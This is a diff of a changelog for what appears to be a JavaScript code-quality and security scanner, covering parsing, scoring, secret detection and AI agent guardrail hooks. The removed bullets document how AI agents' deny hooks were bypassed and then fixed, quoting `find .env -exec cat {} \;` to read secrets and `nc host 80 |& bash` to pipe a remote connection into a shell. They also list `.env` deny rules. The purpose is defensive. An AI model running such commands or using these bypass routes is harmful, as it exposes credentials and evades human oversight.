@@ -2,73 +2,43 @@
 
 ## v0.5.0 - 2026-08-16
 
-- **Concatenated commands stay dynamic** - `const command = "echo " + input` keeps process-exec at warning when the shell is enabled.
-- **Comments above decorators count as documentation** - a comment over `@Post(...)` documents the method, as does one above a split-line signature.
-- **Aliased sole-class exports match their file** - `export { Foo as Bar }` in `bar.ts` no longer draws a class/file mismatch.
-- **Lockfiles drop only the entropy detector** - integrity digests stop reporting; a credential in a `resolved` URL still reports at error severity.
-- **Baseline impact** - NodeGoat entropy findings drop 1,292→0 and nodejs-goof 833→1; zod stays 47 and juice-shop 97.
+120 rules across 11 pillars on Node 22+. Every script rule now reads one shared syntax-only AST parse instead of walking lines, scoring changes shape, config and CLI validation fail instead of coercing, and the release gains gates that fail the build when a documented count or the scan surface drifts from the source.
+
+**Analysis.** Complexity, naming, docblock, and redirect rules read the shared parse, so generic, multi-line, and parenless-arrow declarations are analysed for the first time and complexity findings carry a per-kind `breakdown`. Findings narrow to real evidence: name-only `redirect` helpers, lockfile integrity digests, and bodyless overload signatures stop reporting, while tainted input reaching a response sink and a credential in a `resolved` URL still do. A false-positive sweep took the analyser's own scan to zero findings, which CI now enforces.
+**Scoring.** The composite averages all 11 rule-backed pillars and counts a clean pillar as 100 (ADR-019), so fixing a pillar's last finding cannot lower the score. It stays volume-sensitive and is not yet a cross-project grade: vulnerable nodejs-goof scores 77.9 against clean zod at 18.8.
+**Guardrails and release.** The Claude, Codex, and Copilot agent surfaces move to goat-flow 1.15.1, and three deny-hook bypasses are fixed locally ahead of the upstream template. Packaging is gated by a tarball smoke test that installs the pack fresh and runs the binary, with read-only CI across Node 22, 24, and 26.
+**Needs action before upgrading.** Outside-root scans emit absolute paths, so regenerate any baseline built from a different working directory. `cb` and `fn` now trigger `naming.short-variable` unless listed in `allowlists.acceptedAbbreviations`. `size.file-length` is an error at 1000 substantive lines, which moves `--fail-on` exit codes.
+
+- **BREAKING: External finding paths** - outside-root scans emit absolute paths; regenerate baselines made from a different working directory.
+- **BREAKING: Family abbreviations** - `cb`/`fn` now trigger `naming.short-variable`; add them to `allowlists.acceptedAbbreviations` to retain them.
+- **file-length raised to error at 1000 (family ratification)** - only the threshold and severity moved; `--fail-on` consumers see exit-code changes.
+- **Shared AST discovery (one parse per script)** - generics, multi-line, and parenless arrows analysed; anchors and fingerprints preserved.
+- **Complexity follows control flow** - syntax nodes drive cyclomatic/cognitive; findings gain a `breakdown`; thresholds and identities unchanged.
+- **Docblock rules require the shared parse** - AST signatures only, so paren types cannot fake stale @param tags; bounded files skip the pack.
+- **Composite counts clean pillars as 100** - the mean spans all 11 pillars; fixing a pillar's last finding cannot lower it (ADR-019).
 - **Known scoring limitation** - composite scores remain volume-sensitive: vulnerable nodejs-goof scores 77.9 (C), NodeGoat 52.2 and clean zod 18.8.
-- **Short variables skip local callable parameters** - module-local arrows and test callbacks are exempt; exported bindings stay covered.
+- **Casing consistency follows owners** - variants compare within one module/function/interface owner; DTO vs UI fields no longer conflict.
+- **Re-opened namespaces are one contract** - the merge scope keys on the namespace path, so casing drift between `namespace Api` blocks now reports.
+- **Open-redirect needs a real sink** - name-only `redirect` helpers stay quiet; tainted input to response/location sinks still reports.
+- **React Router redirects are open-redirect sinks** - `react-router` and `react-router-dom` join next/navigation and remix; local helpers stay quiet.
+- **A method named after a redirect import cannot hide it** - only declarations and named function expressions shadow by name; a method name is a key.
+- **process-exec severity follows evidence** - warning only for shell-enabled dynamic commands; fixed vectors advisory; ids churn once (ADR-018).
+- **Lockfiles drop only the entropy detector** - integrity digests stop reporting (NodeGoat 1,292 to 0); a credential in `resolved` still errors.
+- **Short secret previews masked** - under 24 chars shows mask+length; an allowlist cannot hide a same-length secret; hook ids churn once (ADR-017).
+- **Quoted env secrets keep embedded hashes** - quoted values read whole so `#` cannot truncate a credential; unquoted still stop at `#`.
+- **Same-line secrets stay distinct** - column discriminates same-line findings and ships in the hook payload (ADR-017); fingerprints unchanged.
+- **Markdown reports escape repo text** - fenced labels/paths and escaped messages block injection into PR comments. (`src/report-renderers.ts`)
+- **Actions write-permission scopes match GitHub's 2026-07-12 table** - `discussions` and `pages` count as write; `id-token` mints tokens, not writes.
+- **Config validation fails loudly** - unknown rules, non-boolean enabled, bad option keys exit 2 naming accepted forms; compat tightening.
+- **Invalid CLI values fail fast** - format/fail-on/changed-scope validated at parse as usage errors; compat tightening. (`src/cli-program.ts`)
+- **Severity overrides reach every scanner** - one central pass applies rules.<id>.severity everywhere; fingerprints stay severity-free.
+- **Filtered scans cannot record history** - `--history-file` with diff/since/ranges exits 2 before any write; full scans still append.
+- **Diff scoping works from nested directories** - relative-path git diffs; nested runs cannot match siblings; root runs byte-identical.
 - **Parser errors collapse per file** - reports retain the first message plus raw count; angular drops 1,854 diagnostics to 476 affected files.
 - **Non-text scripts skip parsing** - invalid UTF-8 or NUL-bearing files produce a non-fatal `non-text-file` note instead of a parse error.
-- **BREAKING: External finding paths** - outside-root scans emit absolute paths; regenerate baselines made from a different working directory.
-- **React Router redirects are open-redirect sinks** - `react-router` and `react-router-dom` join next/navigation and remix; local helpers stay quiet.
-- **Bodyless signatures skip implementation rules** - multi-line interface and overload signatures no longer draw empty-function or unused-parameter.
-- **Parameter defaults keep names** - comparison expressions and generic arrow defaults no longer swallow or invent parameters in naming findings.
-- **Claude agent surface synced to goat-flow 1.15.1** - deny and Stop hooks route through `run-with-bash.mjs`. (`.claude/settings.json`)
-- **Copilot agent surface lifted from goat-flow 1.12.1 to 1.15.1** - skill pack and deny hook match Claude's. (`.github/hooks/hooks.json`)
-- **Codex runs the post-turn safety scan** - goat-flow 1.15.1 registers a Stop hook beside the Bash deny hook. (`.codex/hooks.json`)
-- **`.env.example` is editable again** - a deny rule cannot carry an exception, so the blanket `**/.env*` deny is replaced by named variants. (`.claude/settings.json`)
-  - Covers `.env`, `.envrc`, the standard environment names, `.env.*.local`, and `backup`/`bak`/`old`/`orig`/`save`/`prod`/`dev`/`secret(s)` copies.
-  - A name outside that list stays readable by the Read tool; the Bash deny hook still blocks shell access to every `.env*` name.
-- **Hook coverage evidence expires** - re-run `goat-flow hooks verify . --agent <id> --scenario <name>` or the audit reports coverage unverified.
-- **Nested find actions no longer mask the outer command** - `find .env -exec cat {} \;` reached the secret guard as `cat {}` and was allowed; the shared segment context is restored after each nested walk. (`.goat-flow/hooks/deny-dangerous/patterns-shell.sh`)
-- **`|&` pipelines reach the same guards as `|`** - `nc host 80 |& bash` was allowed because the stage read as `& bash`. (`.goat-flow/hooks/deny-dangerous/patterns-shell.sh`)
-- **Guardrail hooks deliberately diverge from the goat-flow 1.15.1 template** - the three fixes above are not in the upstream template yet, so `audit --agent <id>` reports `agent-guardrails` as differing and `install`/`hooks sync` would revert them. Re-apply after any goat-flow upgrade.
-- **`secrets` counts as a path, not a word** - `npm run secrets` and `ls secrets` work again, while `secrets/api.key`, `./secrets`, and `~/secrets` stay blocked. (`.goat-flow/hooks/deny-dangerous/patterns-paths.sh`)
-- **CI reads the guardrails it ships** - a hooks job runs shellcheck plus the deny-dangerous and post-turn-safety self-tests, which the Node matrix and the self-scan both skip. (`.github/workflows/ci.yml`)
-- **Preflight lints and exercises the hooks** - shellcheck covers `.goat-flow/hooks`, and a safety hook policy step runs both hook self-tests locally. (`scripts/preflight-checks.sh`)
-- **Agent instruction files stop claiming CSS is scanned** - `.css` left discovery in 0.3.0; each file now names the live allowlist and cites `src/discovery.ts`:`pushSourceFile`. (`CLAUDE.md`, `AGENTS.md`, `.github/copilot-instructions.md`)
-- **Documented counts and the scan surface are tested** - the discovery allowlist and every published rule total are compared against the live source, so a change fails `npm run check` naming the prose surfaces to sweep. (`src/release-truth.test.ts`)
-- **Code map points at the real hook location** - the deny hook is registered from `.goat-flow/hooks/`, not a `.claude/hooks/` directory that never existed; the `docs/`, `.github/`, and `scripts/` subtrees now list every file. (`.goat-flow/code-map.md`)
-- **Architecture doc lists all nine scripts** - and describes `preflight-checks.sh` as the six-check gate it is, including the hook policy self-tests. (`.goat-flow/architecture.md`)
-- **Rule-removal checklist names every count surface** - it covered `docs/rules.md` alone, leaving the `README.md` claims, the `package.json` description, and `.goat-flow/architecture.md` unswept. (`.goat-flow/learning-loop/patterns/rule-catalogue.md`)
-- **Glossary lists the real scan surface** - it now includes the `.npmrc`/`.pypirc`/`.envrc`/`.netrc` credential files the sensitive-data pillar reads. (`.goat-flow/glossary.md`)
-- **file-length raised to error at 1000 (family ratification)** - only the threshold and severity moved; `--fail-on` consumers see exit-code changes.
-- **Composite counts clean pillars as 100** - the mean spans all 11 pillars; fixing a pillar's last finding cannot lower it (ADR-019).
-- **Docblock rules require the shared parse** - AST signatures only, so paren types cannot fake stale @param tags; bounded files skip the pack.
-- **Labeled data-driven loops opt out of loop-in-test** - per-case messages opt out; destructured bodies now analysed. (`src/test-block-rules.ts`)
-- **Acronym-case compares only chosen casings** - forced SCREAMING/lower names exempt; a surviving pair churns identity once. (`src/class-rules.ts`)
-- **process-exec severity follows evidence** - warning only for shell-enabled dynamic commands; fixed vectors advisory; ids churn once (ADR-018).
-- **Zero-finding self-scan restored** - splitter and redirect walk decomposed, clearing the analyser's own CI findings. (`src/findings-helpers.ts`)
-- **Fixture-purpose is clearable as documented** - vocabulary or an 8+ word purpose comment clears it; stacked `//` headers read as one comment.
-- **Task markers must introduce the comment** - quoted, mid-sentence, and fenced mentions of TODO/FIXME/HACK/XXX stay quiet. (`src/comment-rules.ts`)
-- **Docs conventions stop inflating size/naming debt** - file-length counts substantive lines; casing/class allowlists; causal why-phrases accepted.
-- **Release CI is read-only across Node lines** - contents: read only; audit, checks, tests, self-scan on Node 22/24/26. (`.github/workflows/ci.yml`)
-- **Release docs match the package** - eleven commands, 120 rules, Node 22+, runtime roles, schemas, npm surface; JSON keeps `file` + `filePath`.
-- **Tarball smoke gate** - packs in isolation, rejects dev files, installs fresh, runs the binary against a known finding. (`scripts/pack-smoke.sh`)
-- **Executable release drift guards** - 120 descriptors pinned; repeated scans byte-identical after stripping `run.generatedAt`.
-- **BREAKING: Family abbreviations** - `cb`/`fn` now trigger `naming.short-variable`; add them to `allowlists.acceptedAbbreviations` to retain them.
-- **Actions write-permission scopes follow GitHub's 2026-07-12 table** - `artifact-metadata`, `code-quality`, `discussions`, and `pages` now count as write-capable.
-  - `id-token` and `attestations` mint tokens rather than granting repository writes, so they no longer report as over-permissioned outside `pull_request_target`.
-- **Naming separates local edits from contract decisions** - APPLY vs CONFIGURE remediation; class/file mismatch needs a sole public class.
-- **Casing consistency follows owners** - variants compare within one module/function/interface owner; DTO vs UI fields no longer conflict.
-- **Complexity follows control flow** - syntax nodes drive cyclomatic/cognitive; findings gain a per-kind `breakdown`; identities and thresholds unchanged.
-- **Markdown reports escape repo text** - fenced labels/paths and escaped messages block injection into PR comments. (`src/report-renderers.ts`)
-- **Filtered scans cannot record history** - `--history-file` with diff/since/ranges exits 2 before any write; full scans still append.
-- **Short secret previews fully masked** - under 24 chars shows mask+length; longer keeps first/last 4; hook identities churn once (ADR-017).
-- **Short preview allowlists cannot hide same-length secrets** - values under 24 characters remain reportable even when the mask is configured.
-- **Open-redirect needs a real sink** - name-only `redirect` helpers stay quiet; tainted input to response/location sinks still reports.
-- **Quoted env secrets keep embedded hashes** - quoted values read whole so `#` cannot truncate a credential; unquoted still stop at `#`.
-- **Shared AST discovery (one parse per script)** - generics, multi-line, and parenless arrows analysed; anchors and fingerprints preserved.
-- **Symbol-scoped scans cover generic callables** - generic and multi-line functions retain findings when another line in the same callable changes.
-- **Config validation fails loudly** - unknown rules, non-boolean enabled, bad option keys exit 2 naming accepted forms; compat tightening.
-- **Severity overrides reach every scanner** - one central pass applies rules.<id>.severity everywhere; fingerprints stay severity-free.
-- **Invalid CLI values fail fast** - format/fail-on/changed-scope validated at parse as usage errors; compat tightening. (`src/cli-program.ts`)
-- **File-scoped diagnostics on both surfaces** - diff/since keep changed-file diagnostics only; hook adds diagnostics array + fail flag.
-- **Diff scoping works from nested directories** - relative-path git diffs; nested runs cannot match siblings; root runs byte-identical.
-- **Same-line secrets stay distinct** - column discriminates same-line findings and ships in the hook payload (ADR-017); fingerprints unchanged.
-- **Hook identities separate same-line secrets** - column joins the wire identity; baseline suppression still matches on the column-free key.
+- **Guardrail hooks deliberately diverge from the goat-flow template** - `install`/`hooks sync` reverts them; re-apply after any upgrade.
+- **Naming and size false positives cut** - aliased class exports, parameter defaults, short locals, acronym pairs, and bodyless signatures go quiet.
+- **Docs and test false positives cut** - decorator comments, stacked fixture-purpose headers, quoted task markers, and labeled data loops stay quiet.
 
 ## v0.4.0 - 2026-06-11
 
